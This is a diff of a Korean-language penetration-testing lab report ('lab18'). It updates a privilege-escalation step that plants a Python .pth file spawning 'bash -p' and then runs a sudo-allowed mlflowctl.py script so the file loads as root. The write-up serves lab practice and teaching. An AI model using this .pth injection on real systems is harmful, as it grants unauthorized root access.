@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab18
 created: 2026-11-12
-modified: 2026-11-12T18:43:47.465Z
+modified: 2026-11-12T18:47:49.006Z
 published: 2026-11-12
 date: 2026-11-12
 tags:
@@ -289,12 +289,20 @@ printf '%s\n' 'import os; os.execl("/bin/bash", "bash", "-p")' > /opt/tools/mlfl
 
 `printf %s\n` -> 문자열을 출력하고 끝에 줄바꿈을 붙여라.
 `import os; os.execl` -> python 모듈을 불러오고 현재 프로그램을 교체해라
-`/bin/bash`를 실행 권한을 유지한 채(root) 바꿔라.
+`/bin/bash`를 실행 권한을 유지한 채(-p) 실행해라.
 -> 이 내용을 `root.pth`로 저장
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261113032810.png]]
 
+`root.pth` 잘 만들어졌나 확인.
+
 ![[00. Setting/00. 첨부파일/Pasted image 20261113033046.png]]
+
+```
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+```
+
+`root` 권한으로 `mlflowctl.py`를 실행하고
 
 ## 6. 취약점
 
